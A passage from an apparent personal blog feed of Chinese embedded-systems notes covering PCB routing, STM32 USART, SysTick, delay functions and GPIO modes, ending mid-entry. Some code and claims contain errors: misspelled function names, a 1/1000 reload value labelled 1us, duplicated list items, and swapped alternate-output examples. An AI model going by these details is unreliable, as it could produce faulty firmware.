布线五要素</h2><ol><li><strong>规划电路分区</strong>，核心元件布局在整板的正中心，而其它重要元件也尽量分布在中轴线附近；</li><li><strong>电源优于一切</strong>，<strong>电源</strong>的输入输出走线尽量<strong>加粗</strong>（线宽不能超过元件引脚焊盘，或者选择回路走线），不同铜层之间的电源走线可以通过<strong>多个过孔</strong>（2 ~ 6 个）来提高载流能力；</li><li><strong>模块化设计思路</strong>，理解每一个电路模块，对于重要的<strong>模块</strong>和<strong>信号走线</strong>要进行合理的<strong>包地</strong>处理；</li><li><strong>合理的扇出 Fanout 贴片元件引脚</strong>，保持走线的美观；</li><li><strong>最优走线层</strong>通常是指最为靠近完整地平面的走线层；</li></ol><h2 id="PCB-布线基本策略"><a href="#PCB-布线基本策略" class="headerlink" title="PCB 布线基本策略"></a>PCB 布线基本策略</h2><ol><li>首先放置<code>安装孔</code>、<code>接插件</code>、<code>开关</code>等结构件相关的封装位置；</li><li>基于封装<strong>原点</strong>的 X&#x2F;Y 位置，设计封装属性当中的相对 X&#x2F;Y 位置，从而实现封装放置的精确定位；</li><li>首先摆放主控 IC 芯片，然后分功能模块摆放其它 IC 芯片，最后再放置其它的附属元件；</li><li>滤波电容的容值越小，越需要靠近 <strong>IC 芯片的引脚</strong>进行放置（非常重要）；相反的，如果容值较大，则可以适当的放置得距离引脚更远；</li><li>布线过程当中，如果飞线对于元件的连接关系形成了干扰，则可以隐藏 EDA 工具封装<code>值</code>与<code>位号</code>的显示；</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/605828086">https://zhuanlan.zhihu.com/p/605828086</a></li><li><a href="http://www.uinio.com/Electronics/PCB_Principle/">http://www.uinio.com/Electronics/PCB_Principle/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>USART串口通信</title>
    <link href="/2023/11/20/USART%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/"/>
    <url>/2023/11/20/USART%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<p>总结stm32USART串口通信</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>USART：通用同步异步收发器，可以最低使用两个线进行通信。</p><p>UART：通用同步收发器，它也是一种USART。其特点是：</p><ol><li>串行</li><li>异步</li><li>全双工</li><li>两根线</li></ol><p>我们主要将该传输协议分为两层：物理层和协议层</p><h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><p>将USART传输协议分为物理层和协议层，其中物理层使用RS-232标准，这个标准主要规定了，数据传输的接口、信号的通途、电平标准（RS-232使用的是-15 15V的标准）</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311201237569.png"></p><p>不同于TTL电平标准使用5V表示1，0V表示0。RS232标准使用-15V表示1，15V表示0。由于控制芯片大部分使用的是TTL电平标准，所以需要使用一个单独的芯片如（MAX3232）来将RS-232电平标准转换为TTL电平标准。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311201237391.png"></p><p>DB9物理接口：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311201238225.png"></p><p>串口线中的RTS、CTS、DSR、DTR及DCD信号，使用逻辑 1表示信号有效，逻辑0表示信号无效。 例如，当计算机端控制DTR信号线表示为逻辑1时，它是为了告知远端的调制调解器，本机已准备好接收数据，0则表示还没准备就绪。</p><p>虽然DB9一共有9根线，但是在目前的其它工业控制使用的串口通讯中，一般只使用RXD、TXD以及GND三条信号线， 直接传输数据信号，而RTS、CTS、DSR、DTR及DCD信号都被裁剪掉了。</p><h1 id="协议层"><a href="#协议层" class="headerlink" title="协议层"></a>协议层</h1><p>我们主要讲解USART中的异步通信（即USRT），而不是同步通信。</p><p>由于是异步通信，所以是没有时钟线的，该方式通过在传输的数据中添加一些数据校验位来保证数据的传输正确。<strong>并且需要约定好两个通信设备之间的波特率，所谓的波特率就相当于人与人说话时的语速，单片机要求通信的设备之间的语速要一致。</strong>，常见的波特率为4800、9600、115200等。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311201244957.png"></p><p><strong>起始结束位</strong>：数据包的起始信号由一个逻辑0的数据位表示， 而数据包的停止信号可由0.5、1、1.5或2个逻辑1的数据位表示，只要双方约定一致即可。</p><p><strong>有效数据位</strong>：在数据包的起始位之后紧接着的就是要传输的主体数据内容，也称为有效数据，有效数据的长度常被约定为5、6、7或8位长。</p><p><strong>校验位</strong>：这个是可选的。校验方法有奇校验(odd)、偶校验(even)、0校验(space)、1校验(mark)以及无校验(noparity)。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/%E6%89%B9%E6%B3%A8%202023-07-21%20212611.png"></p><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><h2 id="USART结构体定义"><a href="#USART结构体定义" class="headerlink" title="USART结构体定义"></a>USART结构体定义</h2><p>其实就是上面的协议层的第一幅图</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> USART_BaudRate;            <span class="hljs-comment">// 波特率</span><br>    <span class="hljs-type">uint16_t</span> USART_WordLength;          <span class="hljs-comment">// 字长</span><br>    <span class="hljs-type">uint16_t</span> USART_StopBits;            <span class="hljs-comment">// 停止位</span><br>    <span class="hljs-type">uint16_t</span> USART_Parity;              <span class="hljs-comment">// 校验位</span><br>    <span class="hljs-type">uint16_t</span> USART_Mode;                <span class="hljs-comment">// USART模式</span><br>    <span class="hljs-type">uint16_t</span> USART_HardwareFlowControl; <span class="hljs-comment">// 硬件流控制</span><br>&#125; USART_InitTypeDef;<br></code></pre></td></tr></table></figure><ol><li><p>USART_BaudRate： 波特率设置。一般设置为2400、9600、19200、115200。标准库函数会根据设定值计算得到USARTDIV值，从而设置USART_BRR寄存器值。</p></li><li><p>USART_WordLength： 数据帧字长，可选8位或9位。它设定USART_CR1寄存器的M位的值。如果没有使能奇偶校验控制，一般使用8数据位；如果使能了奇偶校验则一般设置为9数据位。</p></li><li><p>USART_StopBits： 停止位设置，可选0.5个、1个、1.5个和2个停止位，它设定USART_CR2寄存器的STOP[1:0]位的值，<strong>一般我们选择1个停止位。</strong></p></li><li><p>USART_Parity： 奇偶校验控制选择，可选USART_Parity_No(无校验)、USART_Parity_Even(偶校验)以及USART_Parity_Odd(奇校验)，它设定USART_CR1寄存器的PCE位和PS位的值。</p></li><li><p>USART_Mode： USART模式选择，有USART_Mode_Rx和USART_Mode_Tx，允许使用逻辑或运算选择两个，它设定USART_CR1寄存器的RE位和TE位。</p></li><li><p>USART_HardwareFlowControl： 硬件流控制选择，只有在硬件流控制模式才有效，可选有使能RTS、使能CTS、同时使能RTS和CTS、不使能硬件流。</p></li></ol><h2 id="USART时钟结构体定义"><a href="#USART时钟结构体定义" class="headerlink" title="USART时钟结构体定义"></a>USART时钟结构体定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> USART_Clock;    <span class="hljs-comment">// 时钟使能控制</span><br>    <span class="hljs-type">uint16_t</span> USART_CPOL;     <span class="hljs-comment">// 时钟极性</span><br>    <span class="hljs-type">uint16_t</span> USART_CPHA;     <span class="hljs-comment">// 时钟相位</span><br>    <span class="hljs-type">uint16_t</span> USART_LastBit;  <span class="hljs-comment">// 最尾位时钟脉冲</span><br>&#125; USART_ClockInitTypeDef;<br></code></pre></td></tr></table></figure><ol><li><p>USART_Clock： 同步模式下SCLK引脚上时钟输出使能控制，可选禁止时钟输出(USART_Clock_Disable)或开启时钟输出(USART_Clock_Enable)；如果使用同步模式发送，一般都需要开启时钟。它设定USART_CR2寄存器的CLKEN位的值。</p></li><li><p>USART_CPOL： 同步模式下SCLK引脚上输出时钟极性设置，可设置在空闲时SCLK引脚为低电平(USART_CPOL_Low)或高电平(USART_CPOL_High)。它设定USART_CR2寄存器的CPOL位的值。</p></li><li><p>USART_CPHA： 同步模式下SCLK引脚上输出时钟相位设置，可设置在时钟第一个变化沿捕获数据(USART_CPHA_1Edge)或在时钟第二个变化沿捕获数据。它设定USART_CR2寄存器的CPHA位的值。USART_CPHA与USART_CPOL配合使用可以获得多种模式时钟关系。</p></li><li><p>USART_LastBit： 选择在发送最后一个数据位的时候时钟脉冲是否在SCLK引脚输出，可以是不输出脉冲(USART_LastBit_Disable)、输出脉冲(USART_LastBit_Enable)。它设定USART_CR2寄存器的LBCL位的值。</p></li><li><p>USART_Clock： 同步模式下SCLK引脚上时钟输出使能控制，可选禁止时钟输出(USART_Clock_Disable)或开启时钟输出(USART_Clock_Enable)；如果使用同步模式发送，一般都需要开启时钟。它设定USART_CR2寄存器的CLKEN位的值。</p></li><li><p>USART_CPOL： 同步模式下SCLK引脚上输出时钟极性设置，可设置在空闲时SCLK引脚为低电平(USART_CPOL_Low)或高电平(USART_CPOL_High)。它设定USART_CR2寄存器的CPOL位的值。</p></li><li><p>USART_CPHA： 同步模式下SCLK引脚上输出时钟相位设置，可设置在时钟第一个变化沿捕获数据(USART_CPHA_1Edge)或在时钟第二个变化沿捕获数据。它设定USART_CR2寄存器的CPHA位的值。USART_CPHA与USART_CPOL配合使用可以获得多种模式时钟关系。</p></li><li><p>USART_LastBit： 选择在发送最后一个数据位的时候时钟脉冲是否在SCLK引脚输出，可以是不输出脉冲(USART_LastBit_Disable)、输出脉冲(USART_LastBit_Enable)。它设定USART_CR2寄存器的LBCL位的值。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>USART时钟结构体，大多都是同步模式需要使用的。</p><p>OL极性和HA相位之间的关系：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311201315630.png"></p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><ol><li>时钟结构体是适用于同步模式的，如果你使用的是异步模式则不需要初始化这个结构体。</li></ol><p>这种协议有以下缺点：</p><ol><li>通信速率低</li><li>通信的距离短</li><li>无法进行多个设备通信</li></ol><p>由于以上的缺点，所以就出现了各种各样的通信协议。我们必须根据我们的需求选择适合的协议。<strong>下面中的出现的协议前面的文字正是该协议的最大优点</strong>。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404302148161.png"></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>串口通信</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SysTick系统定时器</title>
    <link href="/2023/11/20/SysTick%E7%B3%BB%E7%BB%9F%E5%AE%9A%E6%97%B6%E5%99%A8/"/>
    <url>/2023/11/20/SysTick%E7%B3%BB%E7%BB%9F%E5%AE%9A%E6%97%B6%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>对SysTick系统外设的总结</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>SysTick外设不同于之前的EXTI等等片上外设。它是位于内核的外设，并且其内嵌在NVIC中。</p><p>系统定时器中有四个寄存器，当重装载数值寄存器的值递减到0的时候，系统定时器就产生一次中断，以此循环往复。</p><p>因为SysTick是属于CM3内核的外设，所以所有基于CM3内核的单片机都具有这个系统定时器，使得软件在CM3单片机中可以很容易的移植。 系统定时器一般用于操作系统，用于产生时基，维持操作系统的心跳。</p><p>SysTick中的四个寄存器：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311201017466.png"></p><p>其中只有前三个是需要配置的，最后一个不需要配置。</p><h1 id="编程要点"><a href="#编程要点" class="headerlink" title="编程要点"></a>编程要点</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">SysTick_Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(SysTick_config(SystemCoreClock/<span class="hljs-number">1000</span>))<span class="hljs-comment">//1ms的时基</span><br>        <span class="hljs-keyword">for</span>(;;);<br>&#125;<br><br>_IO <span class="hljs-type">uint32_t</span> TimingDelay;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_ms</span><span class="hljs-params">(_IO <span class="hljs-type">uint32_t</span> ntime)</span><br>&#123;<br>    TimingDelay = nTime;<br>    <span class="hljs-keyword">while</span>(TimingDelay != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>内核外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中三种延时函数</title>
    <link href="/2023/11/20/stm32%E4%B8%AD%E4%B8%89%E7%A7%8D%E5%BB%B6%E6%97%B6%E5%87%BD%E6%95%B0/"/>
    <url>/2023/11/20/stm32%E4%B8%AD%E4%B8%89%E7%A7%8D%E5%BB%B6%E6%97%B6%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>stm32中常见的三种延时函数总结</p><span id="more"></span><h1 id="使用循环"><a href="#使用循环" class="headerlink" title="使用循环"></a>使用循环</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//该代码适用于72MHZ下</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_ms</span><span class="hljs-params">(u16 time)</span><br>&#123;<br>    u16 i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(time--)&#123;<br>        i = <span class="hljs-number">12000</span>;<br>        <span class="hljs-keyword">while</span>(i--);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="使用Systick"><a href="#使用Systick" class="headerlink" title="使用Systick"></a>使用Systick</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//先在stm32f10x_it.h中定义</span><br><span class="hljs-keyword">extern</span> _IO <span class="hljs-type">uint32_t</span> TimingDelay<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在stm32f10x_it.c中定义void SysTick_Hankler(void)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">SysTick_Hankler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(TimingDelay != <span class="hljs-number">0x00</span>)&#123;<br>        TimingDelay--;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在main.c中定义</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">SysTick_Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(SysTick_config(SystemCoreClock/<span class="hljs-number">1000</span>))<span class="hljs-comment">//1ms的时基</span><br>        <span class="hljs-keyword">for</span>(;;);<br>&#125;<br><br>_IO <span class="hljs-type">uint32_t</span> TimingDelay;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_ms</span><span class="hljs-params">(_IO <span class="hljs-type">uint32_t</span> ntime)</span><br>&#123;<br>    TimingDelay = nTime;<br>    <span class="hljs-keyword">while</span>(TimingDelay != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>SysTick 时基计算公式：</p><p><strong>Reload Value &#x3D; SysTick Counter Clock (Hz) x  Desired Time base (s)</strong></p><p>Reload Value：就是重加载数，重加载数最大不得超过0xffffff(16,777,215)。<code>SysTick_config()</code>中的参数就是重加载数</p><p>SysTick Counter Clock (Hz)：是系统时钟的频率</p><p>Desired Time：所需要的时基。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">SysTick_Config(SystemCoreClock / <span class="hljs-number">1000</span>) <span class="hljs-comment">//这是1us的重加载数</span><br>SysTick_Config(SystemCoreClock / <span class="hljs-number">1</span>)    <span class="hljs-comment">//这是1s的重加载数</span><br></code></pre></td></tr></table></figure><p>所以需要以x时间为长度，则 <strong>&#x2F;x</strong></p><h1 id="使用汇编进行定时"><a href="#使用汇编进行定时" class="headerlink" title="使用汇编进行定时"></a>使用汇编进行定时</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*!</span><br><span class="hljs-comment"> *  @brief     软件延时</span><br><span class="hljs-comment"> *  @param    ulCount:延时时钟数</span><br><span class="hljs-comment"> *  @return none</span><br><span class="hljs-comment"> *    @note     ulCount每增加1，该函数增加3个时钟</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">SysCtlDelay</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ulCount)</span><br>&#123;<br>    __asm(<span class="hljs-string">&quot;    subs    r0, #1\n&quot;</span><br>          <span class="hljs-string">&quot;    bne.n   SysCtlDelay\n&quot;</span><br>          <span class="hljs-string">&quot;    bx      lr&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这3个时钟指的是CPU时钟，也就是系统时钟。120MHZ，也就是说1s有120M的时钟，一个时钟也就是1&#x2F;120 us，也就是周期是1&#x2F;120 us。3个时钟，因为执行了3条指令。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/345804589">https://zhuanlan.zhihu.com/p/345804589</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的GPIO</title>
    <link href="/2023/11/17/stm32%E4%B8%AD%E7%9A%84GPIO/"/>
    <url>/2023/11/17/stm32%E4%B8%AD%E7%9A%84GPIO/</url>
    
    <content type="html"><![CDATA[<p>stm32中的八种输入、输出模式总结</p><span id="more"></span> <h1 id="各GPIO输入输入模式"><a href="#各GPIO输入输入模式" class="headerlink" title="各GPIO输入输入模式"></a>各GPIO输入输入模式</h1><ol><li>模拟输入：GPIO_Mode_AIN</li><li>浮空输入：GPIO_Mode_IN_FLOATING</li><li>上拉输入：GPIO_Mode_IPU</li><li>下拉输入：GPIO_Mode_IPD</li><li>推挽输出：GPIO_Mode_Out_PP</li><li>开漏输出：GPIO_Mode_Out_OD</li><li>复用推挽输出：GPIO_Mode_AF_OD</li><li>复用开漏输出：GPIO_Mode_AF_OD</li></ol><hr><h2 id="各个模式适用的情况："><a href="#各个模式适用的情况：" class="headerlink" title="各个模式适用的情况："></a>各个模式适用的情况：</h2><p><strong>模拟输入</strong>：关闭施密特触发器，将电压信号传送到片上外设模块（不接上下拉电阻）。<strong>应用ADC模拟输入，或者低功耗下省电。</strong></p><p><strong>浮空输入</strong>：浮空输入状态下，IO的电平状态是不确定的，完全由外部输入决定，如果在该引脚悬空的情况下，读取该端口的电平是不确定的。<strong>可以做KEY识别，RX1。</strong></p><p><strong>上拉输入、下拉输入</strong>：当GPIO引脚无输入时，上拉输入在默认状态下为高电平，下拉输入在默认状态下为低电平。电阻的作用：防止输入端悬空，减少外部电流对芯片的干扰，限流，增加高电平输出时的驱动能力。<strong>IO内部上拉电阻输入。</strong> <strong>IO内部下拉电阻输入。</strong> 当接在这个引脚的外部模块的默认输出高电平的话就是选择上拉输出，否则选择下拉输入。如果不确定外部模块默认是高电平还是低电平则选择<strong>浮空输入</strong>。一般选择上拉电平</p><p><strong>推挽输出</strong>：想要输出高电平就输出高电平，想要输出低电平就输出低电平。<br>一般都是使用这个</p><p><strong>开漏输出</strong>：输出端相当于三极管的集电极。要得到高电平状态需要上拉电阻才行。适合于做电流型的驱动，其<strong>吸收电流的能力相对较强</strong>，一般20mA以内。开漏输出是没有能力输出高电平驱动负载的。一般情况下开漏输出只可以输出低电平，要输出高电平则需要接上拉电阻。</p><p><strong>复用开漏输出推挽输出模式</strong>：可以理解为GPIO口被用作第二功能时的配置情况，即并非作为通用IO口使用。片内外设功能，<strong>复用推挽输出：I2C的SCL、SDA。</strong>，<strong>复用开漏输出：片内外设功能，TX1，MOSI，MISO.SCK.SS。</strong><br>给片上外设使用的，其他情况下如GPIO则不需要使用这种复用模式。</p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在野火霸道中需要注意的是，当你直接配置好led灯的gpio后，这个led灯就会亮。这是因为，霸道的原理图中的led灯是低位点亮。而刚刚复位的gpio的数据输出寄存器的默认值就是0。所以会被点亮，想要关闭我们应该在led的配置函数中使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">GPIO_SetBits(GPIOA,GPIO_Pin); <span class="hljs-comment">//关闭led灯</span><br>GPIO_ResetBits(GPIOA,GPIO_Pin); <span class="hljs-comment">//开启led灯</span><br></code></pre></td></tr></table></figure><p>关于<code>GPIO_SetBits()</code>这个函数是写<code>BSRR</code>这个寄存器，通过写1，对应的数据输出寄存器会被写为1</p><p>关于<code>GPIO_ResetBits()</code>这个函数是写<code>BRR</code>寄存器，通过写1，对应的数据寄存器会被写为0。</p><p>所以我们可以知道，在霸道V2中如果想要打开led灯，则需要使用<code>GPIO_ResetBits</code>函数。想要关闭则使用另一个函数。当然我们也可以使用<code>GPIO_WriteBit()</code>来写<code>BRR</code>和<code>BSRR</code>两个寄存器。</p><h1 id="stm32f4xx系列中的GPIO编程"><a href="#stm32f4xx系列中的GPIO编程" class="headerlink" title="stm32f4xx系列中的GPIO编程"></a>stm32f4xx系列中的GPIO编程</h1><p><code>f4</code>系列的GPIO编程将原来的GPIO口给拆开了，提高了灵活性。</p><p><strong>GP &#x3D; 通用、PP &#x3D; 推挽、PU &#x3D; 上拉、PD &#x3D; 下拉、OD &#x3D; 开漏、AF &#x3D; 复用功能。</strong></p><p><strong>推挽输出和开漏输出的区别就是，前者可以输出高电平和低电平；但是后者只可以输出低电平，如果想要输出高电平的话需要外接一个上拉电阻。其中模拟接口是对于ADC或者是DAC来使用的</strong></p><p>可配置多达 16 个 I&#x2F;O。GPIOx_MODER 寄存器用于选择 I&#x2F;O 方向（输入、输出、AF(就是复用)、模拟）。GPIOx_OTYPER 和 GPIOx_OSPEEDR 寄存器分别用于选择输出类型（推挽或开漏）和速度 (无论采用哪种 I&#x2F;O 方向，都会直接将 I&#x2F;O 速度引脚连接到相应的 GPIOx_OSPEEDR 寄存器位)。无论采用哪种 I&#x2F;O 方向，GPIOx_PUPDR 寄存器都用于选择上拉&#x2F;下拉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> GPIO_Pin;    <span class="hljs-comment">/* 选择要配置的GPIO引脚 */</span><br>    <span class="hljs-type">uint8_t</span>  GPIO_Mode;   <span class="hljs-comment">/* 选择GPIO引脚的工作模式 */</span><br>    <span class="hljs-type">uint8_t</span>  GPIO_Speed;   <span class="hljs-comment">/* 选择GPIO引脚的速率 */</span><br>    <span class="hljs-type">uint8_t</span>  GPIO_OType;  <span class="hljs-comment">/* 选择GPIO引脚输出类型 */</span><br>    <span class="hljs-type">uint8_t</span>  GPIO_PuPd;   <span class="hljs-comment">/* &lt;选择GPIO引脚的上/下拉模式 */</span><br>&#125; GPIO_InitTypeDef;<br><br><span class="hljs-comment">//其中：</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* GPIO端口配置模式的枚举定义</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    GPIO_Mode_IN   = <span class="hljs-number">0x00</span>, <span class="hljs-comment">/*!&lt; 输入模式 */</span><br>    GPIO_Mode_OUT  = <span class="hljs-number">0x01</span>, <span class="hljs-comment">/*!&lt; 输出模式 */</span><br>    GPIO_Mode_AF   = <span class="hljs-number">0x02</span>, <span class="hljs-comment">/*!&lt; 复用模式 */</span><br>    GPIO_Mode_AN   = <span class="hljs-number">0x03</span>  <span class="hljs-comment">/*!&lt; 模拟模式 */</span><br>&#125; GPIOMode_TypeDef;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* GPIO输出类型枚举定义</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    GPIO_OType_PP = <span class="hljs-number">0x00</span>,   <span class="hljs-comment">/*!&lt; 推挽模式 */</span><br>    GPIO_OType_OD = <span class="hljs-number">0x01</span>    <span class="hljs-comment">/*!&lt; 开漏模式 */</span><br>&#125; GPIOOType_TypeDef;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* GPIO输出速率枚举定义</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    GPIO_Speed_2MHz   = <span class="hljs-number">0x00</span>, <span class="hljs-comment">/*!&lt; 2MHz   */</span><br>    GPIO_Speed_25MHz  = <span class="hljs-number">0x01</span>, <span class="hljs-comment">/*!&lt; 25MHz  */</span><br>    GPIO_Speed_50MHz  = <span class="hljs-number">0x02</span>, <span class="hljs-comment">/*!&lt; 50MHz  */</span><br>    GPIO_Speed_100MHz = <span class="hljs-number">0x03</span>  <span class="hljs-comment">/*!&lt;100MHz  */</span><br>&#125; GPIOSpeed_TypeDef;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">*GPIO上/下拉配置枚举定义</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    GPIO_PuPd_NOPULL = <span class="hljs-number">0x00</span>,<span class="hljs-comment">/*浮空*/</span><br>    GPIO_PuPd_UP     = <span class="hljs-number">0x01</span>, <span class="hljs-comment">/*上拉*/</span><br>    GPIO_PuPd_DOWN   = <span class="hljs-number">0x02</span>  <span class="hljs-comment">/*下拉*/</span><br>&#125; GPIOPuPd_TypeDef;<br></code></pre></td></tr></table></figure><h1 id="映射和复用的关系"><a href="#映射和复用的关系" class="headerlink" 